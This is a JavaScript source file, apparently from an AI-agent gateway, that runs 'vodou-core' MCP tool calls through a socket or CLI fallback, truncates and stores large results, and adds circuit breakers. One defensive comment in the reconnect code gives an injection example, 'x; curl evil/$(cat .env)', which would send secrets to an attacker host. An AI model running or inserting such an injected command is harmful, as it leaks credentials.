    return JSON.stringify({ id: safe, offset: start, total: full.length, content, ...(more ? { more: true, next_offset: next, hint: `call expand_result(id="${safe}", offset=${next}) for the next ${EXPAND_WINDOW} chars` } : { more: false }) });
}
function capInlineResult(s, cap, label, convId) {
    // COGS Governor (WS-B): a free/near-limit conversation can carry a smaller cap; never raises it.
    const profCap = getCostProfile(convId)?.toolResultCap;
    const effCap = typeof profCap === 'number' && profCap > 0 ? Math.min(cap, profCap) : cap;
    if (typeof s !== 'string' || s.length <= effCap)
        return s;
    const id = makeStashId(convId);
    stashFullResult(id, s);
    return s.slice(0, effCap) +
        `\n…[${label} truncated: showing first ${effCap} of ${s.length} chars. The full result is parked out-of-band (NOT re-sent each step) — call expand_result with id="${id}" (optional offset=<charPos> or query="<text>") to read the rest.]`;
}
/**
 * Strip emoji header lines from vodou-core call output, returning only the JSON.
 * vodou-core outputs status lines (⚡, 🔧, 📤 Result:) on stdout before the JSON.
 * This cleans it at the source so ALL callers get parseable JSON.
 *
 * If the result exceeds MAX_INLINE_RESULT, saves to disk and returns a preview.
 */
function cleanToolOutput(raw, toolName, toolId) {
    // Strip emoji headers
    let cleaned;
    const marker = '\u{1F4E4} Result:';
    const markerIdx = raw.indexOf(marker);
    if (markerIdx >= 0) {
        const afterMarker = raw.substring(markerIdx + marker.length).trim();
        cleaned = afterMarker || raw;
    }
    else {
        const braceIdx = raw.indexOf('{');
        cleaned = braceIdx >= 0 ? raw.substring(braceIdx) : raw;
    }
    // Small results: return as-is
    if (cleaned.length <= MAX_INLINE_RESULT)
        return cleaned;
    // Large results: park the full blob out-of-band (WS4 stash) and return a smart preview
    // + an expand_result(id) handle so the rest is retrievable WITHOUT re-sending it every
    // iteration. The file path is also surfaced for FS-capable contexts (board workers etc.).
    const id = (toolId && toolId.trim()) || makeStashId();
    stashFullResult(id, cleaned);
    const preview = generatePreview(cleaned, toolName);
    const sizeKB = (cleaned.length / 1024).toFixed(1);
    return `${preview}\n\n[Full output (${sizeKB}KB) parked out-of-band — call expand_result with id="${id}" (optional offset / query) for the complete result; not re-sent each step. Also at .vodou/tool-results/${id}.txt]`;
}
/**
 * Generate a smart preview based on tool/command type.
 */
function generatePreview(output, toolName) {
    const lines = output.split('\n');
    const name = (toolName || '').toLowerCase();
    // Search/grep tools: show match count + first results
    if (/grep|search|find|glob|ripgrep|rg/i.test(name)) {
        const nonEmpty = lines.filter(l => l.trim());
        return `Found ${nonEmpty.length} results. First matches:\n${nonEmpty.slice(0, 20).join('\n')}`;
    }
    // Build/test tools: show last lines (usually the summary)
    if (/build|test|npm|make|cargo|tsc|compile/i.test(name)) {
        const tail = lines.slice(-15).join('\n');
        return `Output (${lines.length} lines). Final output:\n${tail}`;
    }
    // Read/cat tools: show beginning
    if (/read|cat|head|file/i.test(name)) {
        return `File content (${lines.length} lines):\n${output.substring(0, PREVIEW_SIZE)}`;
    }
    // Default: first 2KB
    return output.substring(0, PREVIEW_SIZE) + '\n... (truncated)';
}
/**
 * Clean up tool result files older than 24 hours. Call on gateway startup.
 */
export function cleanStaleToolResults() {
    const dir = path.join(getProjectRoot(), '.vodou', 'tool-results');
    if (!existsSync(dir))
        return;
    const cutoff = Date.now() - 24 * 60 * 60 * 1000;
    try {
        for (const file of readdirSync(dir)) {
            const fp = path.join(dir, file);
            try {
                const stat = statSync(fp);
                if (stat.mtimeMs < cutoff)
                    unlinkSync(fp);
            }
            catch { }
        }
    }
    catch { }
}
/**
 * Run a vodou-core MCP tool call.
 * Fast path: worker socket (~1-2ms). Fallback: CLI spawn (~50-200ms).
 */
// PLAN-MEMORY-VISIBILITY-UI follow-on (deep-think batch breaker).
// When the LLM batch-dispatches add_thought calls after the server has rejected
// them, every subsequent call wastes a round-trip. Track consecutive errors per
// (session_id, tool) and short-circuit after a threshold so the gateway tells
// the LLM "stop calling this tool" — without the LLM having to read each error.
const _addThoughtErrorWindow = [];
const ADD_THOUGHT_ERROR_THRESHOLD = 3;
const ADD_THOUGHT_ERROR_WINDOW_MS = 2_000;
function trackAddThoughtError(sessionId) {
    const now = Date.now();
    while (_addThoughtErrorWindow.length && _addThoughtErrorWindow[0].ts < now - ADD_THOUGHT_ERROR_WINDOW_MS) {
        _addThoughtErrorWindow.shift();
    }
    _addThoughtErrorWindow.push({ ts: now, sessionId });
    return _addThoughtErrorWindow.filter(e => e.sessionId === sessionId).length;
}
function shouldShortCircuitAddThought(sessionId) {
    const now = Date.now();
    const recent = _addThoughtErrorWindow.filter(e => e.sessionId === sessionId && e.ts > now - ADD_THOUGHT_ERROR_WINDOW_MS);
    return recent.length >= ADD_THOUGHT_ERROR_THRESHOLD;
}
/**
 * Single-flight primitive: if `key` is already in-flight in `map`, return that
 * shared promise; otherwise run `factory()`, store its promise, and delete the
 * entry the instant it settles (resolve OR reject — no leak). Extracted so the
 * concurrency behaviour guarding the 2026-06-08 spawn storm is unit-testable.
 */
export function dedupeInFlight(map, key, factory) {
    const existing = map.get(key);
    if (existing)
        return existing;
    const p = factory().finally(() => {
        map.delete(key);
    });
    map.set(key, p);
    return p;
}
export async function runVodouCore(server, tool, args) {
    if (!TOOL_DEDUP_ENABLED)
        return _runVodouCoreImpl(server, tool, args);
    const key = `${server} ${tool} ${createHash('sha256').update(JSON.stringify(args ?? {})).digest('hex')}`;
    if (_inflightToolCalls.has(key)) {
        console.error(`[Executor] dedup: joined in-flight ${server}/${tool} — single-flight collapsed a concurrent identical call (${_inflightToolCalls.size} distinct in flight)`);
    }
    return dedupeInFlight(_inflightToolCalls, key, () => _runVodouCoreImpl(server, tool, args));
}
async function _runVodouCoreImpl(server, tool, args) {
    const toolLabel = `${server}/${tool}`;
    // Circuit breaker: if recent add_thought calls for this session have failed
    // repeatedly, abort early with a strong directive the LLM can't ignore.
    if (server === 'Vodou-Enhanced-Thinking' && tool === 'add_thought') {
        const sid = args?.session_id || args?.sessionId || '';
        if (sid && shouldShortCircuitAddThought(sid)) {
            console.error(`[Executor] ⛔ deep-think circuit broken for session ${sid.slice(0, 8)} — refusing further add_thought calls in this batch`);
            throw new Error(`BATCH ABORTED: ${ADD_THOUGHT_ERROR_THRESHOLD}+ consecutive add_thought calls failed for this session within ${ADD_THOUGHT_ERROR_WINDOW_MS}ms. ` +
                `You are batch-dispatching tool calls instead of writing one thought at a time. ` +
                `STOP calling add_thought. Write the analysis directly in your reply to the user. ` +
                `If the user wants to retry deep thinking, ask them to invoke the skill again with a clearer topic.`);
        }
    }
    // Fast path: worker socket
    const sockResult = await callWorkerSocket('tool', { server, tool, arguments: args });
    if (sockResult?.ok) {
        // For add_thought, also inspect the tool *content* to detect rejection messages
        // wrapped in successful socket responses (the MCP server returns isError:true
        // inside content but the socket layer treats it as ok=true).
        if (server === 'Vodou-Enhanced-Thinking' && tool === 'add_thought') {
            const stdout = sockResult.stdout || '';
            if (/"isError":\s*true|"error":\s*"Rejected:/i.test(stdout)) {
                const sid = args?.session_id || args?.sessionId || '';
                if (sid) {
                    const count = trackAddThoughtError(sid);
                    console.error(`[Executor] add_thought rejection #${count} for session ${sid.slice(0, 8)}`);
                }
            }
        }
        console.error(`[Executor] tool via socket: ${toolLabel}`);
        return cleanToolOutput(sockResult.stdout || '', toolLabel);
    }
    if (sockResult && !sockResult.ok) {
        // Track add_thought rejections at the socket-error level too.
        if (server === 'Vodou-Enhanced-Thinking' && tool === 'add_thought') {
            const sid = args?.session_id || args?.sessionId || '';
            if (sid)
                trackAddThoughtError(sid);
        }
        const errMsg = sockResult.error || '';
        // Connection failure — try reconnecting the server and retry once
        if (/connection|refused|initialization|failed.*connect/i.test(errMsg)) {
            console.error(`[Executor] ${server} connection failed — attempting reconnect + retry`);
            try {
                // execFileSync (array args, no shell) — `server` is LLM-controlled, so
                // a template-string `execSync` here was a command-injection sink
                // (e.g. server = "x; curl evil/$(cat .env)"). Array args neutralize it.
                execFileSync(VC_PATH(), ['reconnect', server], {
                    windowsHide: true, // no phantom console window on Windows
                    cwd: getProjectRoot(),
                    timeout: 15_000,
                    stdio: ['ignore', 'pipe', 'pipe'],
                });
                console.error(`[Executor] ${server} reconnected — retrying call`);
                const retryResult = await callWorkerSocket('tool', { server, tool, arguments: args });
                if (retryResult?.ok) {
                    return cleanToolOutput(retryResult.stdout || '', toolLabel);
                }
            }
            catch {
                console.error(`[Executor] ${server} reconnect failed`);
            }
        }
        throw new Error(sockResult.error || `tool call failed: ${server}/${tool}`);
    }
    // Fallback: CLI spawn (worker socket unavailable)
    console.error(`[Executor] socket unavailable, falling back to CLI: ${server}/${tool}`);
    noteFallback();
    return runVodouCoreCLI(server, tool, args);
}
// Fallback-storm detector. When the worker socket is dead, every tool call
// spawns a fresh vodou-core process — that's the spawn storm Chad observed
// 2026-04-25. Log a single high-visibility warning at 10 fallbacks/minute so
// future regressions are caught the instant they happen.
const _fallbackTimes = [];
const FALLBACK_THRESHOLD = 10;
const FALLBACK_WINDOW_MS = 60_000;
let _lastFallbackAlertAt = 0;
function noteFallback() {
    const now = Date.now();
    _fallbackTimes.push(now);
    // prune outside the window
    while (_fallbackTimes.length && _fallbackTimes[0] < now - FALLBACK_WINDOW_MS) {
        _fallbackTimes.shift();
    }
    if (_fallbackTimes.length >= FALLBACK_THRESHOLD && now - _lastFallbackAlertAt > FALLBACK_WINDOW_MS) {
        _lastFallbackAlertAt = now;
        console.error(`[Executor] ⚠️  WORKER SOCKET STORM: ${_fallbackTimes.length} CLI fallbacks in last 60s — ` +
            `worker process likely dead. Run \`vodou-core worker ensure\` or restart the gateway.`);
    }
}
/**
 * CLI spawn fallback for tool calls.
 * Used when worker socket is unavailable.
 */
async function runVodouCoreCLI(server, tool, args) {
    return new Promise((resolve, reject) => {
        const argsJson = JSON.stringify(args);
        console.error(`[Executor] vodou-core call ${server} ${tool}`);
        const proc = spawn(VC_PATH(), ['call', server, tool, argsJson], {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: DEFAULT_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let stdout = '';
        let stderr = '';
        let settled = false;
        function finish(err, out) {
            if (settled)
                return;
            settled = true;
            if (err)
                reject(err);
            else
                resolve(cleanToolOutput((out ?? stdout) || stderr || '', `${server}/${tool}`));
        }
        const timeoutId = setTimeout(() => {
            try {
                if (proc.kill('SIGKILL')) {
                    finish(new Error(`vodou-core call timed out after ${DEFAULT_TIMEOUT / 1000}s`));
                }
            }
            catch {
                finish(new Error('vodou-core call timed out'));
            }
        }, DEFAULT_TIMEOUT);
        proc.stdout.on('data', (data) => { stdout += data.toString(); });
        proc.stderr.on('data', (data) => { stderr += data.toString(); });
        proc.on('close', (code) => {
            clearTimeout(timeoutId);
            if (code === 0 || stdout) {
                finish(null, stdout || stderr || `Tool completed with code ${code}`);
            }
            else {
                finish(new Error(stderr || `vodou-core call failed with code ${code}`));
            }
        });
        proc.on('error', (err) => {
            clearTimeout(timeoutId);
            finish(err);
        });
    });
}
/**
 * Invoke `vodou-core call-tool <name> <json>` — routes by tool name (built-ins,
 * ToolRouter) without requiring an `mcp_servers` row for a pseudo-server like
 * `vodou-core`. Worker socket has no call-tool path; always CLI spawn.
 */
export async function runVodouCoreCallTool(tool, args) {
    return new Promise((resolve, reject) => {
        const argsJson = JSON.stringify(args);
        const label = `call-tool/${tool}`;
        console.error(`[Executor] vodou-core ${label}`);
        const proc = spawn(VC_PATH(), ['call-tool', tool, argsJson], {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: DEFAULT_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let stdout = '';
        let stderr = '';
        let settled = false;
        function finish(err, out) {
            if (settled)
                return;
            settled = true;
            if (err)
                reject(err);
            else
                resolve(cleanToolOutput((out ?? stdout) || stderr || '', label));
        }
        const timeoutId = setTimeout(() => {
            try {
                if (proc.kill('SIGKILL')) {
                    finish(new Error(`vodou-core call-tool timed out after ${DEFAULT_TIMEOUT / 1000}s`));
                }
            }
            catch {
                finish(new Error('vodou-core call-tool timed out'));
            }
        }, DEFAULT_TIMEOUT);
        proc.stdout.on('data', (data) => { stdout += data.toString(); });
        proc.stderr.on('data', (data) => { stderr += data.toString(); });
        proc.on('close', (code) => {
            clearTimeout(timeoutId);
            if (code === 0 || stdout) {
                finish(null, stdout || stderr || `Tool completed with code ${code}`);
            }
            else {
                finish(new Error(stderr || `vodou-core call-tool failed with code ${code}`));
            }
        });
        proc.on('error', (err) => {
            clearTimeout(timeoutId);
            finish(err);
        });
    });
}
/**
 * Run a vodou-core command (like 'servers' or 'tools').
 * Explicit timeout + kill so child is always reaped.
 */
/** Run `vodou-core board <subcmd> [args...]` and return stdout+stderr. */
async function runBoardCommand(subcmd, ...args) {
    return new Promise((resolve) => {
        const argv = ['board', subcmd, ...args];
        console.error(`[Executor] vodou-core ${argv.join(' ')}`);
        const proc = spawn(VC_PATH(), argv, {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: DEFAULT_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let out = '';
        proc.stdout.on('data', (d) => { out += d.toString(); });
        proc.stderr.on('data', (d) => { out += d.toString(); });
        // P1-4: propagate the exit code. Previously `close` resolved `out || 'ok'`
        // regardless of code, so a FAILED `board complete` (non-zero exit) reported
        // success to the model — a task looked done when it wasn't. Non-zero exit
        // and spawn errors now return an ERROR-marked string the caller surfaces.
        proc.on('close', (code) => {
            const text = out.trim();
            if (code !== 0) {
                resolve(`ERROR: board ${subcmd} exited ${code}${text ? `: ${text}` : ' (no output)'}`);
                return;
            }
            resolve(text || 'ok');
        });
        proc.on('error', (e) => resolve(`ERROR: board ${subcmd} failed to spawn: ${e.message}`));
    });
}
/** Spawn `vodou-core` with an explicit argv array (for commands that take a
 *  multi-word argument, e.g. `intent-search "<query>" --json`). No shell — args
 *  are passed directly, so a query with spaces/quotes is safe from injection. */
async function runVodouCoreArgs(args) {
    return new Promise((resolve, reject) => {
        console.error(`[Executor] vodou-core ${args.map((a) => (a.includes(' ') ? JSON.stringify(a) : a)).join(' ')}`);
        const proc = spawn(VC_PATH(), args, {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: DEFAULT_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let stdout = '';
        let stderr = '';
        const timeoutId = setTimeout(() => { try {
            proc.kill('SIGKILL');
        }
        catch { } }, DEFAULT_TIMEOUT);
        proc.stdout.on('data', (d) => { stdout += d.toString(); });
        proc.stderr.on('data', (d) => { stderr += d.toString(); });
        proc.on('close', () => { clearTimeout(timeoutId); resolve(stdout || stderr || ''); });
        proc.on('error', (err) => { clearTimeout(timeoutId); reject(err); });
    });
}
/**
 * Semantic "find a tool by meaning" (PLAN-LLM-CAPABILITY-AWARENESS Phase 3c).
 * Shells out to `vodou-core intent-search --json` for cosine ranking over the
 * embeddings, then enriches each hit with its description from the local `tools`
 * cache. Honors `ctx.scope` like the catalog. Read-only.
 */
export async function searchToolsForLlm(query, opts) {
    if (opts?.scope?.type === 'skill' || opts?.scope?.type === 'flow') {
        return `No MCP tools exposed in this ${opts.scope.type} workbench.`;
    }
    if (!query)
        return 'error: search_tools requires a `query`.';
    let raw;
    try {
        raw = await runVodouCoreArgs(['intent-search', query, '--json', '--top-k', '8']);
    }
    catch (e) {
        return `search_tools failed to run intent-search: ${e.message}. Fall back to list_available_tools.`;
    }
    let parsed = {};
    try {
        parsed = JSON.parse(raw.trim().split('\n').filter((l) => l.trim().startsWith('{')).pop() || '{}');
    }
    catch {
        return `search_tools: could not parse ranking output. Use list_available_tools instead.`;
    }
    let matches = parsed.matches || [];
    // Integration scope: only the scoped server's tools are in-bounds.
    if (opts?.scope?.type === 'integration') {
        const only = opts.scope.id;
        matches = matches.filter((m) => m.server === only);
    }
    if (matches.length === 0) {
        return `No tools semantically matched "${query}". The semantic index may be empty — run \`vodou-core backfill-intents --apply\`, or use list_available_tools to browse.`;
    }
    const db = getDb();
    const lines = [`Tools matching "${query}" (semantic, best first):`, ''];
    for (const m of matches) {
        const row = db.prepare(`SELECT t.description AS description FROM tools t JOIN mcp_servers s ON t.server_id = s.id
        WHERE s.name = ? AND t.name = ? LIMIT 1`).get(m.server, m.tool);
        const desc = (row?.description || '').replace(/\s+/g, ' ').trim().slice(0, 120);
        lines.push(`- ${m.server}::${m.tool}  (${m.score.toFixed(2)})${desc ? ` — ${desc}` : ''}`);
    }
    lines.push('', 'Call **describe_tool** on the one you want for its exact arguments, then **vodou_core_call** to run it.');
    return lines.join('\n');
}
async function runVodouCoreCommand(command) {
    return new Promise((resolve, reject) => {
        console.error(`[Executor] vodou-core ${command}`);
        const proc = spawn(VC_PATH(), [command], {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: DEFAULT_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let stdout = '';
        let stderr = '';
        const timeoutId = setTimeout(() => {
            try {
                proc.kill('SIGKILL');
            }
            catch { }
        }, DEFAULT_TIMEOUT);
        proc.stdout.on('data', (data) => { stdout += data.toString(); });
        proc.stderr.on('data', (data) => { stderr += data.toString(); });
        proc.on('close', () => {
            clearTimeout(timeoutId);
            resolve(stdout || stderr || 'Command completed');
        });
        proc.on('error', (err) => {
            clearTimeout(timeoutId);
            reject(err);
        });
    });
}
/**
 * Run vodou-core brain "query" — uses intent DB for direct routing.
 * Fast path: worker socket. Fallback: CLI spawn.
 */
const BRAIN_ROUTE_TIMEOUT = 30000;
export async function runBrainRoute(query) {
    // Fast path: worker socket
    const sockResult = await callWorkerSocket('brain', { query, clean: false }, BRAIN_ROUTE_TIMEOUT);
    if (sockResult !== null) {
        if (sockResult.ok) {
            const output = (sockResult.stdout || '').trim();
            if (output) {
                console.error(`[Executor] brain via socket: matched, ${output.length} chars`);
                return { matched: true, output };
            }
        }
        console.error(`[Executor] brain via socket: no match`);
        return { matched: false, output: '' };
    }
    // Fallback: CLI spawn
    console.error(`[Executor] socket unavailable for brain, falling back to CLI`);
    return runBrainRouteCLI(query);
}
/**
 * CLI spawn fallback for brain routing.
 */
async function runBrainRouteCLI(query) {
    return new Promise((resolve) => {
        console.error(`[Executor] vodou-core brain "${query}"`);
        const proc = spawn(VC_PATH(), ['brain', query], {
            windowsHide: true, // no phantom console window on Windows
            cwd: getProjectRoot(),
            env: freshEnv(),
            timeout: BRAIN_ROUTE_TIMEOUT,
            killSignal: 'SIGKILL',
        });
        let stdout = '';
        let stderr = '';
        const timeoutId = setTimeout(() => {
            try {
                proc.kill('SIGKILL');
            }
            catch { }
        }, BRAIN_ROUTE_TIMEOUT);
        proc.on('close', (code) => {
            clearTimeout(timeoutId);
            const output = stdout || '';
            if (code === 0 && output && (output.includes('::') || output.includes('SKILL:'))) {
                resolve({ matched: true, output });
            }
            else {
                resolve({ matched: false, output: '' });
            }
        });
        proc.on('error', () => {
            clearTimeout(timeoutId);
            resolve({ matched: false, output: '' });
        });
        proc.stdout.on('data', (data) => { stdout += data.toString(); });
        proc.stderr.on('data', (data) => { stderr += data.toString(); });
    });
}
/**
 * Check if vodou-core is available
 */
export async function checkExecutorHealth() {
    // Portable executable check. The old `spawn('test', ['-x', …])` relied on a
    // Unix `test` binary that doesn't exist on Windows — the resulting ENOENT
    // fired an unhandled 'error' event (only 'close' was handled) and crashed the
    // gateway before it bound :8765. fs.access(X_OK) is cross-platform; on Windows
    // X_OK degrades to an existence/readability check, which is what we want.
    const checkFile = (filePath) => {
        return new Promise((resolve) => {
            access(filePath, fsConstants.X_OK, (err) => resolve(!err));
        });
    };
    const vcAvailable = await checkFile(VC_PATH());
    return {
        vcAvailable,
        vcPath: VC_PATH()
    };
}
